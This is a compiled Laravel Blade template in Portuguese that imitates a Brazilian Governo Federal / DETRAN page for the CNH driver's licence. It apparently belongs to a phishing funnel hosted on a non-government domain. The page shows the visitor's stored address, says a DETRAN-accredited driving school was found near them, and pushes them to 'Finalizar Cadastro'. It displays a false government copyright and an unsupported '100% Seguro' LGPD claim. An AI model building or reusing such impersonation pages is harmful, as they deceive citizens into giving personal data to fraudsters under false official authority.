<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">Auto Escola Encontrada</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div>
                        <h1 class="text-2xl md:text-3xl font-bold text-[#1B4F9B]">Encontramos uma Auto Escola parceira perto de você</h1>
                    </div>
                    <div class="bg-blue-50 border-l-4 border-[#1B4F9B] p-4 rounded space-y-3">
                        <h2 class="font-bold text-foreground text-lg">Localização confirmada com sucesso.</h2>
                        <p class="text-foreground">Identificamos uma autoescola credenciada pelo <span class="font-bold">DETRAN</span> próxima à sua região, apta a prestar atendimento.</p>
                        <p class="text-foreground">Após a conclusão do seu cadastro, você receberá, por <span class="font-bold">E-MAIL e SMS</span>, todas as informações necessárias, incluindo o endereço completo e os horários de funcionamento da autoescola parceira.</p>
                    </div>
                    <div class="bg-blue-50 border-l-4 border-[#1B4F9B] p-4 rounded">
                        <h3 class="font-bold text-[#1B4F9B] text-xl mb-2" id="endereco"></h3>
                        <p class="text-foreground" id="cidade"></p>
                        <p class="text-foreground" id="cep"></p>
                    </div>
                    <div class="bg-green-50 p-4 rounded-lg">
                        <p class="text-sm text-foreground"><span class="font-bold text-green-800">🔒 Processo 100% Seguro:</span> Seus dados são protegidos pelos mais altos padrões de segurança, com certificação de proteção de dados em conformidade com a LGPD.</p>
                    </div>
                    <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-lg font-semibold bg-[#1B4F9B] hover:bg-[#1B4F9B]/90 text-white" id="btnContinuar">Finalizar Cadastro</button>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
const userData = JSON.parse(sessionStorage.getItem("userData"));
const userAddress = JSON.parse(sessionStorage.getItem("userAddress"));
if(!userData){
    window.location.href = "<?php echo e(url('/login')); ?>";
} 

$('#endereco').text(`${userAddress.endereco}, ${userAddress.numero}, ${userAddress.bairro}`);
$('#cidade').text(`${userAddress.cidade} - ${userAddress.estado}`);
$('#cep').text(`CEP: ${userAddress.cep}`);

$(document).on('click', '#btnContinuar', function(){
    window.location.href = "<?php echo e(url('/aprovado')); ?>";
})

</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/auto-escola.blade.php ENDPATH**/ ?>